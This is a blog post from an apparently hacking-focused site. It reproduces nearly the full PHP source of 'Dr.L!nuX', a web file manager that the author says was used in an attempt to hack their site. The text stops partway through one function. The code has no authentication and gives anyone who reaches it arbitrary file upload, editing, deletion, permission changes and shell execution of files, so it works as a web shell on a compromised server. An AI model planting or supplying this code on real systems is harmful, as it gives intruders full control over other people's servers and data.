---
id: 275
title: 'Dr.L!nuX &#8211; a simple Web-based file manager'
author: admin
layout: post
guid: http://hackingscripts.com/?p=275
permalink: /dr-linux-file-manager/
categories:
  - PHP
tags:
  - dr linux
  - PHP
---
This isn&#8217;t really a hack script as such, but has been used in an attempt to hack one of my websites before.

## Dr.L!nuX Web-based file manager Source Code

<pre class="brush: php; title: ; notranslate" title="">&lt;?php
/*
 * Dr.L!nuX - a simple Web-based file manager
 * Copyright (C) 2004  Daniel Wacker &lt;www.2005_7@hotmail.com&gt;
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 *
 * -------------------------------------------------------------------------
 * While using this script, do NOT navigate with your browser's back and
 * forward buttons! Always open files in a new browser tab!
 * -------------------------------------------------------------------------
 *
 * This is Version 0.9, revision 10
 * =========================================================================
 *
 * Changes of revision 10
 * &lt;uPx@LinuxMaiL.OrG&gt;
 *    added Russian translation
 * &lt;uPx@LinuxMaiL.OrG&gt;
 *    added &lt;/td&gt; to achieve valid XHTML (thanks to Marc Magos)
 *    improved delete function
 * &lt;ava@asl.se&gt;
 *    new list order: folders first
 *
 * Changes of revision 9
 * &lt;uPx@LinuxMaiL.OrG&gt;
 *    added workaround for directory listing, if lstat() is disabled
 *    fixed permisson of uploaded files (thanks to Stephan Duffner)
 *
 * Changes of revision 8
 * &lt;uPx@LinuxMaiL.OrG&gt;
 *    added Turkish translation
 * &lt;uPx@LinuxMaiL.OrG&gt;
 *    added Czech translation
 * &lt;uPx@LinuxMaiL.OrG&gt;
 *    improved charset handling
 *
 * Changes of revision 7
 * &lt;uPx@LinuxMaiL.OrG&gt;
 *    added Spanish translation
 * &lt;uPx@LinuxMaiL.OrG&gt;
 *    added Danish translation
 * &lt;uPx@LinuxMaiL.OrG&gt;
 *    improved rename dialog
 *
 * Changes of revision 6
 * &lt;uPx@LinuxMaiL.OrG&gt;
 *    added Dutch translation
 *
 * Changes of revision 5
 * &lt;uPx@LinuxMaiL.OrG&gt;
 *    added language auto select
 *    fixed symlinks in directory listing
 *    removed word-wrap in edit textarea
 *
 * Changes of revision 4
 * &lt;uPx@LinuxMaiL.OrG&gt;
 *    added French translation
 * &lt;uPx@LinuxMaiL.OrG&gt;
 *    added Swedish translation
 *
 * Changes of revision 3
 * &lt;uPx@LinuxMaiL.OrG&gt;
 *    improved Italian translation
 *
 * Changes of revision 2
 * &lt;uPx@LinuxMaiL.OrG&gt;
 *    got images work in some old browsers
 *    fixed creation of directories
 *    fixed files deletion
 *    improved path handling
 *    added missing word 'not_created'
 * &lt;uPx@LinuxMaiL.OrG&gt;
 *    improved human readability of file sizes
 * &lt;uPx@LinuxMaiL.OrG&gt;
 *    added Italian translation
 *
 * Changes of revision 1
 * &lt;uPx@LinuxMaiL.OrG&gt;
 *    Dr.L!nuX completely rewritten:
 *    - clean XHTML/CSS output
 *    - several files selectable
 *    - support for windows servers
 *    - no more treeview, because
 *      - Dr.L!nuX is a &gt;simple&lt; file manager
 *      - performance problems (too much additional code)
 *      - I don't like: frames, java-script, to reload after every treeview-click
 *    - execution of shell scripts
 *    - introduced revision numbers
 *
/* ------------------------------------------------------------------------- */

/* Your language:
 * 'en' - English
 * 'de' - German
 * 'fr' - French
 * 'it' - Italian
 * 'nl' - Dutch
 * 'se' - Swedish
 * 'es' - Spanish
 * 'dk' - Danish
 * 'tr' - Turkish
 * 'cs' - Czech
 * 'ru' - Russian
 * 'auto' - autoselect
 */
$lang = 'auto';

/* Charset of output:
 * possible values are described in the charset table at
 * http://www.php.net/manual/en/function.htmlentities.php
 * 'auto' - use the same charset as the words of my language are encoded
 */
$site_charset = 'auto';

/* Homedir:
 * For example: './' - the script's directory
 */
$homedir = './';

/* Size of the edit textarea
 */
$editcols = 80;
$editrows = 25;

/* -------------------------------------------
 * Optional configuration (remove # to enable)
 */

/* Permission of created directories:
 * For example: 0705 would be 'drwx---r-x'.
 */
# $dirpermission = 0705;

/* Permission of created files:
 * For example: 0604 would be '-rw----r--'.
 */
# $filepermission = 0604;

/* Filenames related to the apache web server:
 */
$htaccess = '.htaccess';
$htpasswd = '.htpasswd';

/* ------------------------------------------------------------------------- */

if (get_magic_quotes_gpc()) {
	array_walk($_GET, 'strip');
	array_walk($_POST, 'strip');
	array_walk($_REQUEST, 'strip');
}

if (array_key_exists('image', $_GET)) {
	header('Content-Type: image/gif');
	die(getimage($_GET['image']));
}

if (!function_exists('lstat')) {
	function lstat ($filename) {
		return stat($filename);
	}
}

$delim = DIRECTORY_SEPARATOR;

if (function_exists('php_uname')) {
	$win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? true : false;
} else {
	$win = ($delim == '\\') ? true : false;
}

if (!empty($_SERVER['PATH_TRANSLATED'])) {
	$scriptdir = dirname($_SERVER['PATH_TRANSLATED']);
} elseif (!empty($_SERVER['SCRIPT_FILENAME'])) {
	$scriptdir = dirname($_SERVER['SCRIPT_FILENAME']);
} elseif (function_exists('getcwd')) {
	$scriptdir = getcwd();
} else {
	$scriptdir = '.';
}
$homedir = relative2absolute($homedir, $scriptdir);

$dir = (array_key_exists('dir', $_REQUEST)) ? $_REQUEST['dir'] : $homedir;

if (array_key_exists('olddir', $_POST) && !path_is_relative($_POST['olddir'])) {
	$dir = relative2absolute($dir, $_POST['olddir']);
}

$directory = simplify_path(addslash($dir));

$files = array();
$action = '';
if (!empty($_POST['submit_all'])) {
	$action = $_POST['action_all'];
	for ($i = 0; $i &lt; $_POST['num']; $i++) {
		if (array_key_exists("checked$i", $_POST) && $_POST["checked$i"] == 'true') {
			$files[] = $_POST["file$i"];
		}
	}
} elseif (!empty($_REQUEST['action'])) {
	$action = $_REQUEST['action'];
	$files[] = relative2absolute($_REQUEST['file'], $directory);
} elseif (!empty($_POST['submit_upload']) && !empty($_FILES['upload']['name'])) {
	$files[] = $_FILES['upload'];
	$action = 'upload';
} elseif (array_key_exists('num', $_POST)) {
	for ($i = 0; $i &lt; $_POST['num']; $i++) {
		if (array_key_exists("submit$i", $_POST)) break;
	}
	if ($i &lt; $_POST['num']) {
		$action = $_POST["action$i"];
		$files[] = $_POST["file$i"];
	}
}
if (empty($action) && (!empty($_POST['submit_create']) || (array_key_exists('focus', $_POST) && $_POST['focus'] == 'create')) && !empty($_POST['create_name'])) {
	$files[] = relative2absolute($_POST['create_name'], $directory);
	switch ($_POST['create_type']) {
	case 'directory':
		$action = 'create_directory';
		break;
	case 'file':
		$action = 'create_file';
	}
}
if (sizeof($files) == 0) $action = ''; else $file = reset($files);

if ($lang == 'auto') {
	if (array_key_exists('HTTP_ACCEPT_LANGUAGE', $_SERVER) && strlen($_SERVER['HTTP_ACCEPT_LANGUAGE']) &gt;= 2) {
		$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
	} else {
		$lang = 'en';
	}
}

$words = getwords($lang);

if ($site_charset == 'auto') {
	$site_charset = $word_charset;
}

$cols = ($win) ? 4 : 7;

if (!isset($dirpermission)) {
	$dirpermission = (function_exists('umask')) ? (0777 & ~umask()) : 0755;
}
if (!isset($filepermission)) {
	$filepermission = (function_exists('umask')) ? (0666 & ~umask()) : 0644;
}

if (!empty($_SERVER['SCRIPT_NAME'])) {
	$self = html(basename($_SERVER['SCRIPT_NAME']));
} elseif (!empty($_SERVER['PHP_SELF'])) {
	$self = html(basename($_SERVER['PHP_SELF']));
} else {
	$self = '';
}

if (!empty($_SERVER['SERVER_SOFTWARE'])) {
	if (strtolower(substr($_SERVER['SERVER_SOFTWARE'], 0, 6)) == 'apache') {
		$apache = true;
	} else {
		$apache = false;
	}
} else {
	$apache = true;
}

switch ($action) {

case 'view':

	if (is_script($file)) {

		/* highlight_file is a mess! */
		ob_start();
		highlight_file($file);
		$src = ereg_replace('&lt;font color="([^"]*)"&gt;', '&lt;span style="color: \1"&gt;', ob_get_contents());
		$src = str_replace(array('&lt;/font&gt;', "\r", "\n"), array('&lt;/span&gt;', '', ''), $src);
		ob_end_clean();

		html_header();
		echo '&lt;h2 style="text-align: left; margin-bottom: 0"&gt;' . html($file) . '&lt;/h2&gt;

&lt;hr /&gt;

&lt;table&gt;
&lt;tr&gt;
&lt;td style="text-align: right; vertical-align: top; color: gray; padding-right: 3pt; border-right: 1px solid gray"&gt;
&lt;pre style="margin-top: 0"&gt;&lt;code&gt;';

		for ($i = 1; $i &lt;= sizeof(file($file)); $i++) echo "$i\n";

		echo '&lt;/code&gt;&lt;/pre&gt;
&lt;/td&gt;
&lt;td style="text-align: left; vertical-align: top; padding-left: 3pt"&gt;
&lt;pre style="margin-top: 0"&gt;' . $src . '&lt;/pre&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;

';

		html_footer();

	} else {

		header('Content-Type: ' . getmimetype($file));
		header('Content-Disposition: filename=' . basename($file));

		readfile($file);

	}

	break;

case 'download':

	header('Pragma: public');
	header('Expires: 0');
	header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
	header('Content-Type: ' . getmimetype($file));
	header('Content-Disposition: attachment; filename=' . basename($file) . ';');
	header('Content-Length: ' . filesize($file));

	readfile($file);

	break;

case 'upload':

	$dest = relative2absolute($file['name'], $directory);

	if (@file_exists($dest)) {
		listing_page(error('already_exists', $dest));
	} elseif (@move_uploaded_file($file['tmp_name'], $dest)) {
		@chmod($dest, $filepermission);
		listing_page(notice('uploaded', $file['name']));
	} else {
		listing_page(error('not_uploaded', $file['name']));
	}

	break;

case 'create_directory':

	if (@file_exists($file)) {
		listing_page(error('already_exists', $file));
	} else {
		$old = @umask(0777 & ~$dirpermission);
		if (@mkdir($file, $dirpermission)) {
			listing_page(notice('created', $file));
		} else {
			listing_page(error('not_created', $file));
		}
		@umask($old);
	}

	break;

case 'create_file':

	if (@file_exists($file)) {
		listing_page(error('already_exists', $file));
	} else {
		$old = @umask(0777 & ~$filepermission);
		if (@touch($file)) {
			edit($file);
		} else {
			listing_page(error('not_created', $file));
		}
		@umask($old);
	}

	break;

case 'execute':

	chdir(dirname($file));

	$output = array();
	$retval = 0;
	exec('echo "./' . basename($file) . '" | /bin/sh', $output, $retval);

	$error = ($retval == 0) ? false : true;

	if (sizeof($output) == 0) $output = array('&lt;' . $words['no_output'] . '&gt;');

	if ($error) {
		listing_page(error('not_executed', $file, implode("\n", $output)));
	} else {
		listing_page(notice('executed', $file, implode("\n", $output)));
	}

	break;

case 'delete':

	if (!empty($_POST['no'])) {
		listing_page();
	} elseif (!empty($_POST['yes'])) {

		$failure = array();
		$success = array();

		foreach ($files as $file) {
			if (del($file)) {
				$success[] = $file;
			} else {
				$failure[] = $file;
			}
		}

		$message = '';
		if (sizeof($failure) &gt; 0) {
			$message = error('not_deleted', implode("\n", $failure));
		}
		if (sizeof($success) &gt; 0) {
			$message .= notice('deleted', implode("\n", $success));
		}

		listing_page($message);

	} else {

		html_header();

		echo '&lt;form action="' . $self . '" method="post"&gt;
&lt;table class="dialog"&gt;
&lt;tr&gt;
&lt;td class="dialog"&gt;
';

		request_dump();

		echo "\t&lt;b&gt;" . word('really_delete') . '&lt;/b&gt;
	&lt;p&gt;
';

		foreach ($files as $file) {
			echo "\t" . html($file) . "&lt;br /&gt;\n";
		}

		echo '	&lt;/p&gt;
	&lt;hr /&gt;
	&lt;input type="submit" name="no" value="' . word('no') . '" id="red_button" /&gt;
	&lt;input type="submit" name="yes" value="' . word('yes') . '" id="green_button" style="margin-left: 50px" /&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;
&lt;/form&gt;

';

		html_footer();

	}

	break;

case 'rename':

	if (!empty($_POST['destination'])) {

		$dest = relative2absolute($_POST['destination'], $directory);

		if (!@file_exists($dest) && @rename($file, $dest)) {
			listing_page(notice('renamed', $file, $dest));
		} else {
			listing_page(error('not_renamed', $file, $dest));
		}

	} else {

		$name = basename($file);

		html_header();

		echo '&lt;form action="' . $self . '" method="post"&gt;

&lt;table class="dialog"&gt;
&lt;tr&gt;
&lt;td class="dialog"&gt;
	&lt;input type="hidden" name="action" value="rename" /&gt;
	&lt;input type="hidden" name="file" value="' . html($file) . '" /&gt;
	&lt;input type="hidden" name="dir" value="' . html($directory) . '" /&gt;
	&lt;b&gt;' . word('rename_file') . '&lt;/b&gt;
	&lt;p&gt;' . html($file) . '&lt;/p&gt;
	&lt;b&gt;' . substr($file, 0, strlen($file) - strlen($name)) . '&lt;/b&gt;
	&lt;input type="text" name="destination" size="' . textfieldsize($name) . '" value="' . html($name) . '" /&gt;
	&lt;hr /&gt;
	&lt;input type="submit" value="' . word('rename') . '" /&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;

&lt;p&gt;&lt;a href="' . $self . '?dir=' . urlencode($directory) . '"&gt;[ ' . word('back') . ' ]&lt;/a&gt;&lt;/p&gt;

&lt;/form&gt;

';

		html_footer();

	}

	break;

case 'move':

	if (!empty($_POST['destination'])) {

		$dest = relative2absolute($_POST['destination'], $directory);

		$failure = array();
		$success = array();

		foreach ($files as $file) {
			$filename = substr($file, strlen($directory));
			$d = $dest . $filename;
			if (!@file_exists($d) && @rename($file, $d)) {
				$success[] = $file;
			} else {
				$failure[] = $file;
			}
		}

		$message = '';
		if (sizeof($failure) &gt; 0) {
			$message = error('not_moved', implode("\n", $failure), $dest);
		}
		if (sizeof($success) &gt; 0) {
			$message .= notice('moved', implode("\n", $success), $dest);
		}

		listing_page($message);

	} else {

		html_header();

		echo '&lt;form action="' . $self . '" method="post"&gt;

&lt;table class="dialog"&gt;
&lt;tr&gt;
&lt;td class="dialog"&gt;
';

		request_dump();

		echo "\t&lt;b&gt;" . word('move_files') . '&lt;/b&gt;
	&lt;p&gt;
';

		foreach ($files as $file) {
			echo "\t" . html($file) . "&lt;br /&gt;\n";
		}

		echo '	&lt;/p&gt;
	&lt;hr /&gt;
	' . word('destination') . ':
	&lt;input type="text" name="destination" size="' . textfieldsize($directory) . '" value="' . html($directory) . '" /&gt;
	&lt;input type="submit" value="' . word('move') . '" /&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;

&lt;p&gt;&lt;a href="' . $self . '?dir=' . urlencode($directory) . '"&gt;[ ' . word('back') . ' ]&lt;/a&gt;&lt;/p&gt;

&lt;/form&gt;

';

		html_footer();

	}

	break;

case 'copy':

	if (!empty($_POST['destination'])) {

		$dest = relative2absolute($_POST['destination'], $directory);

		if (@is_dir($dest)) {

			$failure = array();
			$success = array();

			foreach ($files as $file) {
				$filename = substr($file, strlen($directory));
				$d = addslash($dest) . $filename;
				if (!@is_dir($file) && !@file_exists($d) && @copy($file, $d)) {
					$success[] = $file;
				} else {
					$failure[] = $file;
				}
			}

			$message = '';
			if (sizeof($failure) &gt; 0) {
				$message = error('not_copied', implode("\n", $failure), $dest);
			}
			if (sizeof($success) &gt; 0) {
				$message .= notice('copied', implode("\n", $success), $dest);
			}

			listing_page($message);

		} else {

			if (!@file_exists($dest) && @copy($file, $dest)) {
				listing_page(notice('copied', $file, $dest));
			} else {
				listing_page(error('not_copied', $file, $dest));
			}

		}

	} else {

		html_header();

		echo '&lt;form action="' . $self . '" method="post"&gt;

&lt;table class="dialog"&gt;
&lt;tr&gt;
&lt;td class="dialog"&gt;
';

		request_dump();

		echo "\n&lt;b&gt;" . word('copy_files') . '&lt;/b&gt;
	&lt;p&gt;
';

		foreach ($files as $file) {
			echo "\t" . html($file) . "&lt;br /&gt;\n";
		}

		echo '	&lt;/p&gt;
	&lt;hr /&gt;
	' . word('destination') . ':
	&lt;input type="text" name="destination" size="' . textfieldsize($directory) . '" value="' . html($directory) . '" /&gt;
	&lt;input type="submit" value="' . word('copy') . '" /&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;

&lt;p&gt;&lt;a href="' . $self . '?dir=' . urlencode($directory) . '"&gt;[ ' . word('back') . ' ]&lt;/a&gt;&lt;/p&gt;

&lt;/form&gt;

';

		html_footer();

	}

	break;

case 'create_symlink':

	if (!empty($_POST['destination'])) {

		$dest = relative2absolute($_POST['destination'], $directory);

		if (substr($dest, -1, 1) == $delim) $dest .= basename($file);

		if (!empty($_POST['relative'])) $file = absolute2relative(addslash(dirname($dest)), $file);

		if (!@file_exists($dest) && @symlink($file, $dest)) {
			listing_page(notice('symlinked', $file, $dest));
		} else {
			listing_page(error('not_symlinked', $file, $dest));
		}

	} else {

		html_header();

		echo '&lt;form action="' . $self . '" method="post"&gt;

&lt;table class="dialog" id="symlink"&gt;
&lt;tr&gt;
	&lt;td style="vertical-align: top"&gt;' . word('destination') . ': &lt;/td&gt;
	&lt;td&gt;
		&lt;b&gt;' . html($file) . '&lt;/b&gt;&lt;br /&gt;
		&lt;input type="checkbox" name="relative" value="yes" id="checkbox_relative" checked="checked" style="margin-top: 1ex" /&gt;
		&lt;label for="checkbox_relative"&gt;' . word('relative') . '&lt;/label&gt;
		&lt;input type="hidden" name="action" value="create_symlink" /&gt;
		&lt;input type="hidden" name="file" value="' . html($file) . '" /&gt;
		&lt;input type="hidden" name="dir" value="' . html($directory) . '" /&gt;
	&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
	&lt;td&gt;' . word('symlink') . ': &lt;/td&gt;
	&lt;td&gt;
		&lt;input type="text" name="destination" size="' . textfieldsize($directory) . '" value="' . html($directory) . '" /&gt;
		&lt;input type="submit" value="' . word('create_symlink') . '" /&gt;
	&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;

&lt;p&gt;&lt;a href="' . $self . '?dir=' . urlencode($directory) . '"&gt;[ ' . word('back') . ' ]&lt;/a&gt;&lt;/p&gt;

&lt;/form&gt;

';

		html_footer();

	}

	break;

case 'edit':

	if (!empty($_POST['save'])) {

		$content = str_replace("\r\n", "\n", $_POST['content']);

		if (($f = @fopen($file, 'w')) && @fwrite($f, $content) !== false && @fclose($f)) {
			listing_page(notice('saved', $file));
		} else {
			listing_page(error('not_saved', $file));
		}

	} else {

		if (@is_readable($file) && @is_writable($file)) {
			edit($file);
		} else {
			listing_page(error('not_edited', $file));
		}

	}

	break;

case 'permission':

	if (!empty($_POST['set'])) {

		$mode = 0;
		if (!empty($_POST['ur'])) $mode |= 0400; if (!empty($_POST['uw'])) $mode |= 0200; if (!empty($_POST['ux'])) $mode |= 0100;
		if (!empty($_POST['gr'])) $mode |= 0040; if (!empty($_POST['gw'])) $mode |= 0020; if (!empty($_POST['gx'])) $mode |= 0010;
		if (!empty($_POST['or'])) $mode |= 0004; if (!empty($_POST['ow'])) $mode |= 0002; if (!empty($_POST['ox'])) $mode |= 0001;

		if (@chmod($file, $mode)) {
			listing_page(notice('permission_set', $file, decoct($mode)));
		} else {
			listing_page(error('permission_not_set', $file, decoct($mode)));
		}

	} else {

		html_header();

		$mode = fileperms($file);

		echo '&lt;form action="' . $self . '" method="post"&gt;

&lt;table class="dialog"&gt;
&lt;tr&gt;
&lt;td class="dialog"&gt;

	&lt;p style="margin: 0"&gt;' . phrase('permission_for', $file) . '&lt;/p&gt;

	&lt;hr /&gt;

	&lt;table id="permission"&gt;
	&lt;tr&gt;
		&lt;td&gt;&lt;/td&gt;
		&lt;td style="border-right: 1px solid black"&gt;' . word('owner') . '&lt;/td&gt;
		&lt;td style="border-right: 1px solid black"&gt;' . word('group') . '&lt;/td&gt;
		&lt;td&gt;' . word('other') . '&lt;/td&gt;
	&lt;/tr&gt;
	&lt;tr&gt;
		&lt;td style="text-align: right"&gt;' . word('read') . ':&lt;/td&gt;
		&lt;td&gt;&lt;input type="checkbox" name="ur" value="1"'; if ($mode & 00400) echo ' checked="checked"'; echo ' /&gt;&lt;/td&gt;
		&lt;td&gt;&lt;input type="checkbox" name="gr" value="1"'; if ($mode & 00040) echo ' checked="checked"'; echo ' /&gt;&lt;/td&gt;
		&lt;td&gt;&lt;input type="checkbox" name="or" value="1"'; if ($mode & 00004) echo ' checked="checked"'; echo ' /&gt;&lt;/td&gt;
	&lt;/tr&gt;
	&lt;tr&gt;
		&lt;td style="text-align: right"&gt;' . word('write') . ':&lt;/td&gt;
		&lt;td&gt;&lt;input type="checkbox" name="uw" value="1"'; if ($mode & 00200) echo ' checked="checked"'; echo ' /&gt;&lt;/td&gt;
		&lt;td&gt;&lt;input type="checkbox" name="gw" value="1"'; if ($mode & 00020) echo ' checked="checked"'; echo ' /&gt;&lt;/td&gt;
		&lt;td&gt;&lt;input type="checkbox" name="ow" value="1"'; if ($mode & 00002) echo ' checked="checked"'; echo ' /&gt;&lt;/td&gt;
	&lt;/tr&gt;
	&lt;tr&gt;
		&lt;td style="text-align: right"&gt;' . word('execute') . ':&lt;/td&gt;
		&lt;td&gt;&lt;input type="checkbox" name="ux" value="1"'; if ($mode & 00100) echo ' checked="checked"'; echo ' /&gt;&lt;/td&gt;
		&lt;td&gt;&lt;input type="checkbox" name="gx" value="1"'; if ($mode & 00010) echo ' checked="checked"'; echo ' /&gt;&lt;/td&gt;
		&lt;td&gt;&lt;input type="checkbox" name="ox" value="1"'; if ($mode & 00001) echo ' checked="checked"'; echo ' /&gt;&lt;/td&gt;
	&lt;/tr&gt;
	&lt;/table&gt;

	&lt;hr /&gt;

	&lt;input type="submit" name="set" value="' . word('set') . '" /&gt;

	&lt;input type="hidden" name="action" value="permission" /&gt;
	&lt;input type="hidden" name="file" value="' . html($file) . '" /&gt;
	&lt;input type="hidden" name="dir" value="' . html($directory) . '" /&gt;

&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;

&lt;p&gt;&lt;a href="' . $self . '?dir=' . urlencode($directory) . '"&gt;[ ' . word('back') . ' ]&lt;/a&gt;&lt;/p&gt;

&lt;/form&gt;

';

		html_footer();

	}

	break;

default:

	listing_page();

}

/* ------------------------------------------------------------------------- */

function getlist ($directory) {
	global $delim, $win;

	if ($d = @opendir($directory)) {

		while (($filename = @readdir($d)) !== false) {

			$path = $directory . $filename;

			if ($stat = @lstat($path)) {

				$file = array(
					'filename'    =&gt; $filename,
					'path'        =&gt; $path,
					'is_file'     =&gt; @is_file($path),
					'is_dir'      =&gt; @is_dir($path),
					'is_link'     =&gt; @is_link($path),
					'is_readable' =&gt; @is_readable($path),
					'is_writable' =&gt; @is_writable($path),
					'size'        =&gt; $stat['size'],
					'permission'  =&gt; $stat['mode'],
					'owner'       =&gt; $stat['uid'],
					'group'       =&gt; $stat['gid'],
					'mtime'       =&gt; @filemtime($path),
					'atime'       =&gt; @fileatime($path),
					'ctime'       =&gt; @filectime($path)
				);

				if ($file['is_dir']) {
					$file['is_executable'] = @file_exists($path . $delim . '.');
				} else {
					if (!$win) {
						$file['is_executable'] = @is_executable($path);
					} else {
						$file['is_executable'] = true;
					}
				}

				if ($file['is_link']) $file['target'] = @readlink($path);

				if (function_exists('posix_getpwuid')) $file['owner_name'] = @reset(posix_getpwuid($file['owner']));
				if (function_exists('posix_getgrgid')) $file['group_name'] = @reset(posix_getgrgid($file['group']));

				$files[] = $file;

			}

		}

		return $files;

	} else {
		return false;
	}

}

function sortlist ($list, $key, $reverse) {

	$dirs = array();
	$files = array();
	
	for ($i = 0; $i &lt; sizeof($list); $i++) {
		if ($list[$i]['is_dir']) $dirs[] = $list[$i];
		else $files[] = $list[$i];
	}

	quicksort($dirs, 0, sizeof($dirs) - 1, $key);
	if ($reverse) $dirs = array_reverse($dirs);

	quicksort($files, 0, sizeof($files) - 1, $key);
	if ($reverse) $files = array_reverse($files);

	return array_merge($dirs, $files);

}

function quicksort (&$array, $first, $last, $key) {

	if ($first &lt; $last) {

		$cmp = $array[floor(($first + $last) / 2)][$key];

		$l = $first;
		$r = $last;

		while ($l &lt;= $r) {

			while ($array[$l][$key] &lt; $cmp) $l++;
			while ($array[$r][$key] &gt; $cmp) $r--;

			if ($l &lt;= $r) {

				$tmp = $array[$l];
				$array[$l] = $array[$r];
				$array[$r] = $tmp;

				$l++;
				$r--;

			}

		}

		quicksort($array, $first, $r, $key);
		quicksort($array, $l, $last, $key);

	}

}

function permission_octal2string ($mode) {

	if (($mode & 0xC000) === 0xC000) {
		$type = 's';
	} elseif (($mode & 0xA000) === 0xA000) {
		$type = 'l';
	} elseif (($mode & 0x8000) === 0x8000) {
		$type = '-';
	} elseif (($mode & 0x6000) === 0x6000) {
		$type = 'b';
	} elseif (($mode & 0x4000) === 0x4000) {
		$type = 'd';
	} elseif (($mode & 0x2000) === 0x2000) {
		$type = 'c';
	} elseif (($mode & 0x1000) === 0x1000) {
		$type = 'p';
	} else {
		$type = '?';
	}

	$owner  = ($mode & 00400) ? 'r' : '-';
	$owner .= ($mode & 00200) ? 'w' : '-';
	if ($mode & 0x800) {
		$owner .= ($mode & 00100) ? 's' : 'S';
	} else {
		$owner .= ($mode & 00100) ? 'x' : '-';
	}

	$group  = ($mode & 00040) ? 'r' : '-';
	$group .= ($mode & 00020) ? 'w' : '-';
	if ($mode & 0x400) {
		$group .= ($mode & 00010) ? 's' : 'S';
	} else {
		$group .= ($mode & 00010) ? 'x' : '-';
	}

	$other  = ($mode & 00004) ? 'r' : '-';
	$other .= ($mode & 00002) ? 'w' : '-';
	if ($mode & 0x200) {
		$other .= ($mode & 00001) ? 't' : 'T';
	} else {
		$other .= ($mode & 00001) ? 'x' : '-';
	}

	return $type . $owner . $group . $other;

}

function is_script ($filename) {
	return ereg('\.php$|\.php3$|\.php4$|\.php5$', $filename);
}

function getmimetype ($filename) {
	static $mimes = array(
		'\.jpg$|\.jpeg$'  =&gt; 'image/jpeg',
		'\.gif$'          =&gt; 'image/gif',
		'\.png$'          =&gt; 'image/png',
		'\.html$|\.html$' =&gt; 'text/html',
		'\.txt$|\.asc$'   =&gt; 'text/plain',
		'\.xml$|\.xsl$'   =&gt; 'application/xml',
		'\.pdf$'          =&gt; 'application/pdf'
	);

	foreach ($mimes as $regex =&gt; $mime) {
		if (eregi($regex, $filename)) return $mime;
	}

	// return 'application/octet-stream';
	return 'text/plain';

}

function del ($file) {
	global $delim;

	if (!file_exists($file)) return false;

	if (@is_dir($file) && !@is_link($file)) {

		$success = false;

		if (@rmdir($file)) {

			$success = true;

		} elseif ($dir = @opendir($file)) {

			$success = true;

			while (($f = readdir($dir)) !== false) {
				if ($f != '.' && $f != '..' && !del($file . $delim . $f)) {
					$success = false;
				}
			}
			closedir($dir);

			if ($success) $success = @rmdir($file);

		}

		return $success;

	}

	return @unlink($file);

}

function addslash ($directory) {
	global $delim;

	if (substr($directory, -1, 1) != $delim) {
		return $directory . $delim;
	} else {
		return $directory;
	}

}

function relative2absolute ($string, $directory) {

	if (path_is_relative($string)) {
		return simplify_path(addslash($directory) . $string);
	} else {
		return simplify_path($string);
	}

}

function path_is_relative ($path) {
	global $win;

	if ($win) {
		return (substr($path, 1, 1) != ':');
	} else {
		return (substr($path, 0, 1) != '/');
	}

}

function absolute2relative ($directory, $target) {
	global $delim;

	$path = '';
	while ($directory != $target) {
		if ($directory == substr($target, 0, strlen($directory))) {
			$path .= substr($target, strlen($directory));
			break;
		} else {
			$path .= '..' . $delim;
			$directory = substr($directory, 0, strrpos(substr($directory, 0, -1), $delim) + 1);
		}
	}
	if ($path == '') $path = '.';

	return $path;

}

function simplify_path ($path) {
	global $delim;

	if (@file_exists($path) && function_exists('realpath') && @realpath($path) != '') {
		$path = realpath($path);
		if (@is_dir($path)) {
			return addslash($path);
		} else {
			return $path;
		}
	}

	$pattern  = $delim . '.' . $delim;

	if (@is_dir($path)) {
		$path = addslash($path);
	}

	while (strpos($path, $pattern) !== false) {
		$path = str_replace($pattern, $delim, $path);
	}

	$e = addslashes($delim);
	$regex = $e . '((\.[^\.' . $e . '][^' . $e . ']*)|(\.\.[^' . $e . ']+)|([^\.][^' . $e . ']*))' . $e . '\.\.' . $e;

	while (ereg($regex, $path)) {
		$path = ereg_replace($regex, $delim, $path);
	}
	
	return $path;

}

function human_filesize ($filesize) {

	$suffices = 'kMGTPE';

	$n = 0;
	while ($filesize &gt;= 1000) {
		$filesize /= 1024;
		$n++;
	}

	$filesize = round($filesize, 3 - strpos($filesize, '.'));

	if (strpos($filesize, '.') !== false) {
		while (in_array(substr($filesize, -1, 1), array('0', '.'))) {
			$filesize = substr($filesize, 0, strlen($filesize) - 1);
		}
	}

	$suffix = (($n == 0) ? '' : substr($suffices, $n - 1, 1));

	return $filesize . " {$suffix}B";

}

function strip (&$str) {
	$str = stripslashes($str);
}

/* ------------------------------------------------------------------------- */

function listing_page ($message = null) {
	global $self, $directory, $sort, $reverse;

	html_header();

	$list = getlist($directory);

	if (array_key_exists('sort', $_GET)) $sort = $_GET['sort']; else $sort = 'filename';
	if (array_key_exists('reverse', $_GET) && $_GET['reverse'] == 'true') $reverse = true; else $reverse = false;

	$list = sortlist($list, $sort, $reverse);

	echo '&lt;h1 style="margin-bottom: 0"&gt;Dr.L!nuX: uPx@LinuxMaiL.OrG&lt;/h1&gt;

&lt;form enctype="multipart/form-data" action="' . $self . '" method="post"&gt;

&lt;table id="main"&gt;
';

	directory_choice();

	if (!empty($message)) {
		spacer();
		echo $message;
	}

	if (@is_writable($directory)) {
		upload_box();
		create_box();
	} else {
		spacer();
	}

	if ($list) {
		listing($list);
	} else {
		echo error('not_readable', $directory);
	}

	echo '&lt;/table&gt;

&lt;/form&gt;

';

	html_footer();

}

function listing ($list) {
	global $directory, $homedir, $sort, $reverse, $win, $cols, $date_format, $self;

